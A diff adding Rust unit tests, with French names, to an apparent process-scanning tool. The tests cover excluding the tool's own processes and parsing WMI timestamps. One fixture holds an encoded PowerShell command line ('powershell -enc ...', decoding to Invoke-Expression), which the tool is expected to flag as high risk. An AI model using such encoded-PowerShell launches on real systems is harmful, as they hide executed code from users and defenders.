+        let mut vanguard = processus(100, 4, "vanguard.exe", "090000");
+        vanguard.chemin = Some(moi.into());
+        let mut cache = processus(600, 500, "powershell.exe", "083000");
+        cache.ligne = Some("powershell -enc SQBFAFgA".into());
+        let liste = vec![
+            vanguard,
+            processus(500, 100, "explorer.exe", "080000"),
+            cache,
+            processus(200, 100, "powershell.exe", "090001"),
+        ];
+        let ecartes = de_vanguard(&liste, 100, Some(moi));
+        assert!(ecartes.contains(&100) && ecartes.contains(&200), "{ecartes:?}");
+        assert!(!ecartes.contains(&500) && !ecartes.contains(&600), "{ecartes:?}");
+        let c = juger_programmes(&liste, Os::Windows, &ecartes, None);
+        assert!(
+            c.len() == 1 && c[0].probleme == Some(Niveau::Eleve) && c[0].message.contains("PID 600"),
+            "{}",
+            c[0].message
+        );
+        // Une date manque : le lien est gardé.
+        let sans: Vec<EnMarche> = liste
+            .into_iter()
+            .map(|p| EnMarche {
+                ne: if p.pid == 500 { None } else { p.ne },
+                ..p
+            })
+            .collect();
+        let ecartes = de_vanguard(&sans, 100, Some(moi));
+        assert!(ecartes.contains(&500) && ecartes.contains(&600), "{ecartes:?}");
+    }
+
+    /// Les dates de WMI : à la microseconde, ramenées en UTC.
+    #[test]
+    fn dates_de_naissance() {
+        let d = |t: &str| date_cim(t).map(|d| d.format("%Y-%m-%d %H:%M:%S%.6f").to_string());
+        assert_eq!(
+            d("20261021063000.123456-240").as_deref(),
+            Some("2026-10-21 10:30:00.123456")
+        );
+        assert_eq!(
+            d("20261021063000.000000+060").as_deref(),
+            Some("2026-10-21 05:30:00.000000")
+        );
+        assert!(date_cim("20261021063000.000001+000") > date_cim("20261021063000.000000+000"));
+        // Le même instant écrit à l'heure d'été (UTC−4), puis à l'heure normale (UTC−5).
+        assert_eq!(
+            date_cim("20261101013000.000000-240"),
+            date_cim("20261101003000.000000-300")
+        );
+        for illisible in ["", "pas une date", "20261021063000", "20261021063000.000000"] {
+            assert_eq!(date_cim(illisible), None, "{illisible}");
+        }
     }
 
     /// Élevés et moyens dans deux constats, chacun à son niveau ; un nom piégé ne pilote pas le terminal.
